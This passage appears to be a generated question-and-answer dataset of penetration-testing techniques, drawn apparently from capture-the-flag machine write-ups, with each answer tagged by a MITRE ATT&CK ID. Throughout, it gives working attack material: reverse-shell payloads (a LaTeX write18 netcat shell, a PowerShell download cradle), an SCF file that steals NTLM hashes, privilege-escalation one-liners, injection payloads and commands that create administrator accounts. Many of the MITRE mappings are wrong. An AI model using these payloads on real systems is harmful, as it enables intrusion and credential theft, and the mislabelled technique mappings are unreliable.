A: To bypass firewall restrictions using ncat, you can set the source port to a specific value and use that to connect to a remote service that may be listening on a non-standard port. For example, if port 987 is open on the remote host, you can use the following command to connect to it:

ncat -l 4444 --sh-exec "ncat 192.168.5.2 987 -p 53" &

This will set up a listener on port 4444 that will forward traffic to port 987 on the remote host, using port 53 as the source port. This can be used to access services that may be blocked by firewall rules. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: What are some techniques to perform authentication bypass on web applications?
A: One technique for authentication bypass is to reuse a valid PHP session ID. This can be done by inspecting the target application's cookies and replacing the existing session ID with a valid one. This can allow access to the application without valid credentials. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Initial Access, Credential Access.

## Q: What steps can be taken to exploit the Unreal IRCD 3.2.8.1 backdoor vulnerability?
A: The Unreal IRCD 3.2.8.1 version had a backdoor added that allowed execution of commands prefixed with 'AB;'. The Metasploit module 'unreal_ircd_3281_backdoor' can be used to exploit this vulnerability and gain a shell. Alternatively, the backdoor can be triggered manually by echoing the command 'AB; <malicious_command>' to the target on port 65534. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement, Initial Access.

## Q: How can you leverage the SUID binary '/usr/bin/viewuser' to escalate privileges on the system?
A: The SUID binary '/usr/bin/viewuser' can be exploited to escalate privileges on the system. The binary first calls setuid(0) to set the effective user ID to root, then executes the '/tmp/listusers' file. By creating a malicious '/tmp/listusers' file containing a reverse shell, the binary will execute the shell with root privileges when run. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How could you use a database backup script to escalate privileges to root on the system?
A: The backup script '/usr/bin/backup.sh' runs as root and archives the 'courses' directory, then extracts it to '/home/giovanni/work/tmp' with world-writable permissions. To escalate to root:1. Rename or delete the 'courses' directory.2. Create a symlink 'courses' pointing to '/root'.3. Wait for the backup script to run, which will archive and extract the '/root' directory contents to '/home/giovanni/work/tmp'.4. The root flag will then be accessible in the extracted '/home/giovanni/work/tmp/courses' directory. MITRE References: MITRE ID is T1106, MITRE Name is: Execute Privileged Code, and MITRE Tactics are: Privilege Escalation, Execution.

## Q: How can you use Linux capabilities to escalate privileges on a system?
A: Linux capabilities allow system administrators to grant specific capabilities to a binary, instead of running the entire program as root. For example, the tcpdump binary can be granted the cap_net_admin and cap_net_raw capabilities to allow it to capture network traffic, without needing to run as the root user. These capabilities can be abused to gain elevated access, such as by using a binary with capabilities to read sensitive files like /etc/shadow. The getcap command can be used to list the capabilities set on a binary, and capabilities can be added or removed using the setcap command. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use LDAP enumeration to gather credentials and information on a system?
A: LDAP is often used to store user account information, and if the LDAP server is misconfigured to allow anonymous binds, an attacker can enumerate the LDAP directory to gather usernames, email addresses, and password hashes. The ldapsearch command can be used to perform LDAP enumeration, specifying the LDAP server address, the base distinguished name (DN) to search, and using the -x flag for an anonymous bind. The results may contain sensitive information that can be used to gain access to the system. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Initial Access.

## Q: How can you use packet sniffing to capture credentials from unencrypted protocols?
A: If a system is running services that use unencrypted protocols, like LDAP, an attacker can use a tool like tcpdump to capture the network traffic and extract sensitive information like passwords and hashes. The tcpdump command can be used to capture traffic on a specific port, like 389 for LDAP, and the resulting PCAP file can be analyzed in a tool like Wireshark to extract the credentials. This technique can be especially effective if the target binary has been granted elevated Linux capabilities to access raw network sockets. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Discovery, Credential Access.

## Q: How can you enumerate a web server to discover hidden directories, files, and other information?
A: You can use the Gobuster tool (version 3.1.0) to perform directory/file enumeration on a web server. For example, the command 'gobuster dir -u http://10.10.10.120 -w directory-list-2.3-medium.txt -t 100 -x php' will scan the web server at 10.10.10.120, use the medium sized directory list, and look for PHP files. This can help discover hidden or sensitive content on the web server. MITRE References: MITRE ID is T1593, MITRE Name is: Server Software Component Discovery, and MITRE Tactics are: Discovery.

## Q: How can you break out of a restricted shell to gain more privileges on a system?
A: To break out of a restricted shell, you can try abusing a GTFOBin like Tar. The command 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' will execute a shell and break out of the restricted environment. You can then fix the PATH variable to regain full access. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you extract saved credentials from a user's Mozilla Firefox profile?
A: You can use the 'firefox_decrypt' tool (from https://github.com/unode/firefox_decrypt) to extract saved credentials from a Firefox profile. First, copy the .mozilla/firefox/ directory to your local system. Then run 'firefox_decrypt.py ../home/ayush/.mozilla/firefox/' and provide the Firefox profile password to decrypt the contents and obtain any saved login credentials. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: Credential Access.

## Q: How can you leverage a LaTex code execution vulnerability to gain a foothold on a system?
A: Some LaTex packages are vulnerable to code execution vulnerabilities. You can use the payload '\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.25 4444 >/tmp/f}' to execute a reverse shell on the system. This bypasses blacklisted commands by using the '\immediate\write18' syntax to directly execute system commands. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you use Juicy Potato to escalate privileges on a Windows 10 Enterprise system with the SeImpersonate privilege enabled?
A: To escalate privileges on a Windows 10 Enterprise system with the SeImpersonate privilege enabled, you can use the Juicy Potato tool:1. Download the Juicy Potato binary from the releases page: https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe2. Create a batch script that will give you a SYSTEM shell, e.g.:whoami /all > C:\Users\Public\proof.txt3. Transfer both the Juicy Potato binary and the batch script to the target system.4. Identify a valid CLSID that can be used with Juicy Potato to escalate to SYSTEM. A list of Windows 10 Enterprise CLSIDs can be found here: https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_10_Enterprise.md5. Run Juicy Potato with the appropriate arguments:.\juicypotato.exe -t * -p C:\Users\Destitute\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}6. Verify the SYSTEM shell by checking the proof.txt file.7. You can now use the SYSTEM shell to change the Administrator password:net user Administrator abc123!8. Finally, use PsExec to get a SYSTEM shell:psexec.py administrator@10.10.10.116 # password: abc123! MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you steal NTLM hashes from a SMB share?
A: To steal NTLM hashes from an SMB share, you can create an .scf file with the following contents and copy it to a writable folder on the share:

[Shell]
Command=2
IconFile=\\10.10.14.3\share\pwn.ico
[Taskbar]
Command=ToggleDesktop

When a user opens the share, the .scf file will cause their NTLM hashes to be sent to your Responder server listening on the specified IP address. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you perform a Kerberoast attack to obtain a user's password hash?
A: To perform a Kerberoast attack:

1. Use the `setspn.exe` tool to find any users with an associated Service Principal Name (SPN):
   `setspn.exe -T htb -Q */*`
2. Create a token for a valid user account using `MakeToken`.
3. Use Kerberoast to request a Kerberos ticket for the user with the SPN.
4. Crack the obtained ticket hash using a tool like Hashcat (mode 13100) and a password dictionary. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Credential Access.

## Q: How can you exploit a WordPress site using a SQL injection vulnerability?
A: To exploit a WordPress site using SQL injection, you can use the exploit found at https://www.exploit-db.com/exploits/41006/. This exploit allows you to authenticate as the admin user by setting the target URL and username. After gaining access to the WordPress admin panel, you can further explore the site and potentially find additional vulnerabilities or information. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: What other Linux privilege escalation enumeration tools are mentioned in the text?
A: The text mentions two other Linux privilege escalation enumeration tools: LinEnum and LinPeas. These tools have been actively developed and enhanced over recent years to perform automated checks for potential privilege escalation vectors on Linux systems. MITRE References: MITRE ID is T1057, MITRE Name is: Process Discovery, and MITRE Tactics are: Discovery.

## Q: How can an unprivileged user escalate privileges by abusing insecure cron job permissions?
A: An unprivileged user can escalate privileges by finding a cron job that runs as root and has insecure file permissions. The user can then modify the cron job script to include a reverse shell one-liner, which will be executed with root privileges when the cron job runs. To do this, the user can inspect the cron log file for running cron jobs, find a script with insecure permissions, and edit the script to include the reverse shell. MITRE References: MITRE ID is T1053.003, MITRE Name is: Scheduled Task/Job: Cron, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: What are some techniques for leveraging insecure file permissions to escalate privileges on a Linux system?
A: One technique for leveraging insecure file permissions is to find an executable file that allows write access and runs at an elevated privilege level, such as a cron job script. An unprivileged user can then modify the contents of the script to include a reverse shell one-liner, which will be executed with root privileges when the cron job runs. MITRE References: MITRE ID is T1059.004, MITRE Name is: Command and Scripting Interpreter: Unix Shell, and MITRE Tactics are: Privilege Escalation, Execution.

## Q: How can you use tcpdump to sniff for and capture clear-text passwords on a Linux system?
A: To use tcpdump to capture clear-text passwords on a Linux system, you can run the following command: `sudo tcpdump -i lo -A | grep pass`. This will capture traffic on the loopback interface (`-i lo`) and display the ASCII-encoded packet contents (`-A`), allowing you to grep for the keyword "pass" which may reveal clear-text passwords. However, this requires having sudo permissions to run tcpdump, which is a privileged operation. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Credential Access.

## Q: How can you abuse misconfigured SUID binaries to escalate privileges on a Linux system?
A: If a SUID binary has security vulnerabilities, an attacker can exploit them to gain elevated privileges. For example, running the 'find' command with the '-exec' parameter can allow executing a root shell. The SUID bit causes the effective user ID of the process to be the owner of the file, which is typically root, granting the attacker elevated privileges. MITRE References: MITRE ID is T1548.001, MITRE Name is: Abuse Elevation Control Mechanism: Setuid and Setgid, and MITRE Tactics are: Privilege Escalation.

## Q: How can a user abuse sudo permissions on a Linux system to obtain root access?
A: On Linux systems, the sudo command can be used to execute commands with elevated privileges. To abuse sudo permissions, a user can inspect the configured sudo permissions in the /etc/sudoers file to identify commands that are allowed to be run with sudo. If the permissions are too permissive, the user may be able to leverage these commands to escalate privileges and obtain a root shell. For example, if the sudoers file allows the user to run tcpdump with sudo, the user can abuse this by using GTFOBins to craft a payload that spawns a root shell. However, mandatory access control mechanisms like AppArmor may block such attempts, so the user would need to find alternative escalation paths. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can an attacker compile a Linux kernel exploit on the target system to ensure compatibility?
A: To ensure compatibility, the attacker can transfer the exploit source code to the target system and compile it using the target's GCC compiler. This helps match the target's architecture and library dependencies, reducing the risk of compilation issues. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you perform enumeration of a GraphQL endpoint to extract sensitive information?
A: To perform enumeration of a GraphQL endpoint and extract sensitive information:1. Use cURL or a tool like GraphiQL to interact with the GraphQL endpoint. 2. Try querying for basic information like the 'user' object and its fields like 'username' and 'password'.3. Use the 'query' parameter to craft GraphQL queries and extract sensitive data like credentials.4. Expand the query to retrieve more user fields or related objects that could contain valuable information.5. Automate the process of trying different queries to brute force and enumerate the GraphQL API. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you exploit a blind SQL injection vulnerability in a web application to extract password hashes?
A: To exploit a blind SQL injection vulnerability and extract password hashes:1. Identify the SQL injection point, for example in request parameters.2. Use Boolean-based blind SQLi to determine if a username exists, e.g. 'username' = 'admin' AND 1=1 -- 3. Extract the password hash character-by-character using the SUBSTR() function, e.g. SUBSTR((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'a' -- 4. Script the process to automate the extraction of the full password hash.5. Use a cracking tool or online service to crack the extracted password hash. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Privilege Escalation.

## Q: How can you exploit a kernel vulnerability to escalate privileges to root on a Linux system?
A: To exploit a kernel vulnerability to escalate privileges to root:1. Identify the kernel version running on the target system.2. Research known kernel exploits for the specific version.3. Download and compile the appropriate kernel exploit locally.4. Transfer the compiled exploit to the target system.5. Execute the kernel exploit to gain a root shell. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a vulnerability in the `screen` SUID binary to gain root privileges?
A: To exploit a vulnerability in the `screen` SUID binary, you can follow these steps:1. Compile a malicious shared object (libhax.so) that will create a root shell when loaded.2. Compile a standalone root shell binary (rootshell).3. Copy the malicious files to the target system and execute the commands to load the shared object and run the root shell.This exploits a flaw in `screen` where it loads library files insecurely, allowing you to hijack the SUID functionality to gain root privileges. The version 4.05.00 of `screen` is known to be vulnerable to this attack. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use Burp Suite to bypass authentication and obtain SMTP configuration information?
A: To bypass authentication and obtain SMTP configuration information using Burp Suite, you can follow these steps:1. Intercept the request to the /?login page and look for a cookie named `Modus` with a base64-encoded value of `Configure=NULL`.2. Change the value to `Configure=True` and forward the request to /?smtp_config.3. This will allow you to view the SMTP configuration, which you can then modify to add your own IP address to the whitelist.This technique relies on exploiting a misconfiguration in the web application to gain unauthorized access to sensitive SMTP settings. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you use SQL injection to extract sensitive information from a database?
A: To extract sensitive information using SQL injection, you can follow these steps:1. Identify a parameter that is vulnerable to SQL injection, such as the `nhsnum` parameter in the /?remind page.2. Craft SQL injection payloads to test the vulnerability, such as `' or 1=1 -- -` and `' or 1=2 -- -`.3. Observe the server's response to determine the number of columns in the table and which column is injectable.4. Use more advanced SQL injection techniques, such as `UNION SELECT` and `GROUP_CONCAT()`, to extract sensitive data like table and column names, and ultimately the contents of the `admin` table. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Credential Access.

## Q: How can you use LDAP injection to bypass authentication on a web application?
A: To bypass LDAP authentication using injection, you can try payloads like `*)(uid=*` to determine if the application is vulnerable. If the server doesn't respond with an error message, it may be due to character blacklisting. You can try double URL encoding the payload, such as `%2A%29%28uid%3D%2A`, to bypass this. If the server responds with "Cannot login", it indicates the LDAP query was successful but the login failed due to an incorrect OTP. You can then use boolean logic to brute force the username by injecting payloads like `*)(uid=a*` and checking the server's response. Once you have the username, you can try to find sensitive attributes like the token string by brute forcing common LDAP attributes. MITRE References: MITRE ID is T1587, MITRE Name is: Develop Capabilities, and MITRE Tactics are: TA0011.

## Q: How can you abuse symlinks and wildcards to read sensitive files on a Linux system?
A: To abuse symlinks and wildcards to read sensitive files, you can create a symlink to a sensitive file like `/etc/sudoers` or `/etc/shadow` and name it `listfile`. Then, create a file named `@listfile`. When the backup script runs and attempts to archive all files in the directory using a wildcard (`*`), it will follow the symlink and include the contents of the sensitive file in the archive. You can then view the contents of the archive to read the sensitive file. MITRE References: MITRE ID is T1222, MITRE Name is: File and Directory Permissions Modification, and MITRE Tactics are: TA0005.

## Q: How can you brute force a PPTP login?
A: You can brute force a PPTP login using the techniques described in the /generic-methodologies-and-resources/brute-force#pptp section. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you leverage a Local File Inclusion (LFI) vulnerability to achieve Remote Code Execution (RCE) on a target system?
A: If you discover an LFI vulnerability, you can attempt to include PHP files that execute arbitrary code on the server. First, try including common PHP files like '/etc/passwd' or '/proc/self/environ' to verify the LFI. Then, upload a PHP reverse shell to a writable location on the server (e.g., a shared SMB folder) and include that file through the LFI to gain remote code execution. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What is module hijacking, and how can you leverage it to escalate privileges on a Linux system?
A: Module hijacking is a technique where you replace a legitimate, setuid-enabled module with a malicious one to gain elevated privileges. On Linux, if a cron job or other privileged process imports a module from a writable directory, you can replace that module with your own malicious version to execute code as root. To perform module hijacking, identify a writable directory in the module search path, create a malicious module, and replace the legitimate one before the privileged process executes it. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you exploit a vulnerability in PRTG Network Monitor to gain a system shell?
A: To exploit a vulnerability in PRTG Network Monitor version 18.1.37 or earlier:1. Log into the PRTG web interface using the 'prtgadmin' user and password.2. Navigate to 'Setup' > 'Account Settings' > 'Notifications'.3. Add a new notification and enter a command to add a new user to the Administrators group, such as 'net user htb abc123! /add ; net localgroup administrators htb /add'.4. Save the notification and trigger it by clicking the bell icon.5. Use psexec to log in as the newly created 'htb' user with the password 'abc123!'. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you use Powershell to establish a reverse shell when exploiting PRTG Network Monitor?
A: To establish a reverse shell when exploiting PRTG Network Monitor:1. Create a Powershell script with a reverse shell command, such as 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.32 -Port 4444'.2. Convert the Powershell command to a base64-encoded string in UTF-16LE encoding:   echo -n 'IEX(new-object net.webclient).downloadstring(''http://10.10.16.32/Invoke-PowerShellTcp.ps1'')' | iconv -t UTF-16LE | base64 -w03. In the PRTG notification settings, use the base64-encoded command as the parameter.4. Start a simple HTTP server to host the Invoke-PowerShellTcp.ps1 script.5. Trigger the notification to execute the reverse shell. MITRE References: MITRE ID is T1059.001, MITRE Name is: Command and Scripting Interpreter: PowerShell, and MITRE Tactics are: TA0002.

## Q: How can you create HTTPS client certificates to bypass authentication?
A: To create HTTPS client certificates, you can follow these steps:1. Generate a private key using openssl: openssl genrsa -out client.key 20482. Create a certificate signing request (CSR) with the private key: openssl req -new -key client.key -out client.csr3. Sign the CSR with the CA certificate and key: openssl x509 -req -in client.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out client.pem -days 1024 -sha2564. Create a PKCS12 formatted certificate: openssl pkcs12 -export -out client.pfx -inkey client.key -in client.pem -certfile intermediate.cert.pem5. Import the client.pfx certificate into your browser to use it for authentication. MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: TA0003 Persistence.

## Q: How can you leverage NFS exploitation to gain access to a system?
A: To leverage NFS exploitation, you can follow these steps:1. Use showmount -e <target_ip> to list the NFS shares exported by the target system.2. Mount the NFS share with the correct permissions using mount -t nfs <target_ip>:<share> /mnt.3. If the share is accessible, you can attempt to access sensitive files or directories based on the permissions.4. If the share is restricted, you can try to access it using a user ID (UID) that matches the owner of the restricted directory. MITRE References: MITRE ID is T1222, MITRE Name is: File and Directory Permissions Modification, and MITRE Tactics are: TA0005 Defense Evasion.

## Q: How can you identify and exploit flaws in custom application encryption logic to escalate privileges?
A: To identify and exploit flaws in custom application encryption logic, you can follow these steps:1. Decompile or analyze the source code of the application to understand the encryption implementation.2. Identify any weaknesses or flaws in the encryption logic, such as the use of a weak algorithm, hardcoded keys, or insecure key generation.3. Attempt to reverse-engineer the encryption to recover the plaintext credentials or other sensitive information.4. Use the recovered information to escalate privileges and gain higher access on the system. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006 Credential Access.

## Q: How can you bypass UAC on a Windows Server 2019 system?
A: According to the article, you can bypass UAC on Windows Server 2019 through DLL hijacking using SystemPropertiesAdvanced.exe, which auto-elevates. First, you need to get a meterpreter session and migrate to a process running in session 1, as PSRemoting uses session 0. You can use GreatSCT to generate a msbuild/meterpreter/rev_tcp payload that is easy to evade. Then, you create a malicious DLL named srrstr.dll and place it in the WindowsApps folder. Finally, you execute the SystemPropertiesAdvanced.exe binary to trigger the DLL hijacking and gain a SYSTEM shell. MITRE References: MITRE ID is T1548.002, MITRE Name is: Abuse Elevation Control Mechanism: Bypass User Account Control, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a Java deserialization vulnerability in Apache MyFaces?
A: The Apache MyFaces application running on Tomcat is vulnerable to insecure deserialization of JSF viewstates. First, you need to find the encryption key and HMAC algorithm used for the viewstate from the web.xml.bak file. The key is 'SnNGOTg3Ni0=' and the HMAC algorithm is HmacSHA1. Then, you can use Ysoserial to generate a malicious serialized payload, encrypt it using pyDes with the found key, and calculate the HMAC using the same key. Finally, you send the encoded payload as the 'javax.faces.ViewState' parameter to exploit the deserialization vulnerability and gain remote code execution. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you use a padding oracle vulnerability to encrypt arbitrary data?
A: Once a padding oracle vulnerability has been identified, it can be used to encrypt arbitrary data by using the padbuster tool (version 0.3.3). The command to encrypt the string 'user=admin' is: padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user=admin MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you use environment variables to escalate privileges on a system with a SUID binary?
A: If a SUID binary executes a command without specifying the full path, it can be vulnerable to privilege escalation by modifying the PATH environment variable. This can be done by setting the working directory as the first option in PATH using the command 'export PATH=.:$PATH'. Then, creating a malicious executable named the same as the command used by the SUID binary (in this case, 'cat') will cause the SUID binary to execute the malicious file with root privileges. MITRE References: MITRE ID is T1169, MITRE Name is: Sudo/Sudo Caching, and MITRE Tactics are: TA0004.

## Q: How can we exploit the backdoored vsftpd server to gain access to the target system?
A: The backdoored vsftpd server can be exploited by connecting to it, sending a failed login attempt, and then connecting to the backdoored port 6200 to execute commands. This can be done using a small Python script that creates a connection to the FTP port, sends the commands, and then connects to the backdoored port. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can we use the LFI vulnerability on the HTTPS service to obtain the SSH private key?
A: The HTTPS service is vulnerable to LFI, which can be used to access the SSH private key located at ../.ssh/id_rsa. By crafting the URL to include the path to the private key and base64 encoding it, we can retrieve the SSH private key and use it to log in to the system as the 'professor' user. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Credential Access.

## Q: How can we leverage the inode ownership of a file to gain root privileges on the target system?
A: By enumerating the running crons using pspy, we can identify a file owned by root that is used by the supervisord process. Even though we don't have write permissions to the file, we own the inode. We can rename the file, create a malicious script, and then modify the supervisord configuration to execute our script, which will give us a root shell when the cron runs. MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: Privilege Escalation.

## Q: How can we exploit a vulnerability in a Python application that uses a weak Random Number Generator (RNG) to gain Remote Code Execution (RCE)?
A: If a Python application uses a weak RNG, we can brute force the seed used to generate the random numbers and gain access to the signing key used to verify expressions passed to the eval() function. We can then craft a malicious expression, sign it with the recovered signing key, and execute it on the server to gain RCE. This can be done by analyzing the RNG implementation, generating a large number of possible seeds, and testing each one to find the correct signing key. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0002.

## Q: How can we use SQL injection to write a file on the server and execute it to gain a reverse shell?
A: By exploiting a SQL injection vulnerability in a web application, we can use SQLite3 commands to attach a database to a world-writable directory and write a PHP file containing a reverse shell payload. We can then request this file to execute the payload and gain a reverse shell on the server. This technique bypasses restrictions on dangerous functions by leveraging the functionality of the SQLite3 database. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: What techniques can you use to escalate privileges from a low-privileged Linux user to root?
A: To escalate privileges from a low-privileged Linux user to root:1. Check for any group memberships that provide access to sensitive files or functionality, such as the 'grub' group.2. Inspect system configuration files and kernel images for any hardcoded credentials or password generation logic.3. Look for any cronjobs or scheduled tasks running as root that can be abused to execute arbitrary commands.4. Analyze any setuid or setgid binaries that can be exploited to gain root privileges.5. Check for any kernel exploits or misconfigurations that can be leveraged to break out of the user's context. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: How can you abuse symlinks to view the source code of PHP files?
A: You can abuse symlinks to view the source code of PHP files by naming the files with a different extension like .txt to avoid execution of the PHP code. For example, by running "symlink /var/www/html/signup.php public_html/signup.txt" and then browsing to "http://onetwoseven.htb/~ots-lMmVkNzA/signup.txt", you can view the source code of the signup.php file. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass Apache rewrite rules to upload a PHP shell?
A: To bypass the Apache rewrite rules and upload a PHP shell, you can take advantage of the fact that the rewrite rule matches the URI "addon-upload.php" or "addon-download.php" and replaces it with "addons/ots-man-addon.php". By sending a request to "http://Localhost:60080/Addon-Download.Php&/Addon-Upload.Php", the addon-download.php is changed to addons/ots-man-addon.php by Apache, after which the ots-man-addon matches addon-upload.php in the URI and allows you to upload the shell. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you abuse the apt package manager to execute code as root?
A: To abuse the apt package manager to execute code as root, you can leverage the fact that the www user has permissions to upgrade local packages and that the apt package manager uses a proxy server defined in the http_proxy environment variable. By setting up a malicious proxy server that redirects requests to packages.onetwoseven.htb to your own server, you can serve a malicious deb package that will be installed by the apt upgrade command, allowing you to execute a reverse shell as root. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can you exploit the insecure password storage in the mRemoteNG application to retrieve credentials?
A: The mRemoteNG application (version 1.76.11 and earlier) stores credentials insecurely, making it vulnerable to credential disclosure. To exploit this vulnerability:

1. Obtain the confCons.xml configuration file from the target system, typically located at C:\Users\<username>\AppData\Roaming\mRemoteNG\confCons.xml.
2. Import the confCons.xml file into the mRemoteNG application.
3. Use the "Password lookup" external tool in mRemoteNG to display the decrypted passwords. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: Credential Access.

## Q: What is the ZipSlip vulnerability and how can it be used to upload a shell to a web server?
A: The ZipSlip vulnerability allows a malicious zip file to write files to forbidden locations via path traversal when extracted. This can be used to upload a PHP reverse shell to a web server's archives folder by creating a zip file with a crafted path. The evilarc tool can be used to generate the malicious zip file, specifying the depth of the path traversal and the location to write the shell. The shell can then be uploaded to the server and executed. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0004, TA0005.

## Q: How can a vulnerable version of Gogs (version 0.11.66) be exploited to gain a root shell?
A: Gogs version 0.11.66 was vulnerable to CVE-2018-18925, which allowed for remote code execution by uploading a crafted Git repository. The vulnerability can be exploited by creating a malicious cookie, uploading it to the Gogs server, and then modifying the session cookie to point to the crafted repository. This gives the attacker admin privileges, allowing them to add a malicious Git hook that executes a reverse shell when a commit is made. Additionally, the Gogs server runs with the 'git' user, which has the 'gosu' binary set as SUID, allowing the attacker to escalate to root privileges. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004, TA0005.

## Q: How can the Magento version 1.9.0.0 vulnerability CVE-2015-1397 be exploited?
A: The CVE-2015-1397 vulnerability, known as Magento Shoplift, allows for arbitrary SQL command execution. The vulnerability can be exploited using a PoC script that injects malicious SQL commands into the 'popularity' parameter. The script creates a new admin user with the credentials 'ypwq / 123' which can then be used to log into the Magento admin panel. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can the Vim editor be used to escalate privileges on the Magento system?
A: The Magento system allows the www user to run Vim as root via sudo. Vim is a known 'GTFOBin', which means it can be used to break out of restricted shells. To escalate privileges, the following command can be used: 'sudo /usr/bin/vi /var/www/html/php.ini.sample -c ":!/bin/bash"'. This will execute a root shell within the Vim context. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use ROP (Return Oriented Programming) to bypass ASLR and NX protections on a binary to gain a root shell?
A: To bypass ASLR and NX protections using ROP, you can follow these steps:1. Find a buffer overflow vulnerability in the binary.2. Leak the address of a known library function like puts() to determine the base address of the libc library.3. Use ROP gadgets to construct a chain that calls system('/bin/sh') or setuid(0) followed by system('/bin/sh') to gain a root shell.4. The key is to find the necessary ROP gadgets in the binary's code that can be chained together to execute your payload. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use the SUID (Set User ID) bit to gain a root shell on a vulnerable Linux system?
A: To gain a root shell using a SUID binary vulnerability, you can follow these steps:1. Identify a SUID binary on the system that has a vulnerability, such as a buffer overflow.2. Analyze the binary using tools like GDB and checksec to determine the protections in place (ASLR, NX, etc).3. Develop a ROP-based exploit to bypass the protections and gain code execution as the root user.4. The key is to find the necessary ROP gadgets in the binary's code that can be chained together to execute your payload and escalate privileges to root. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

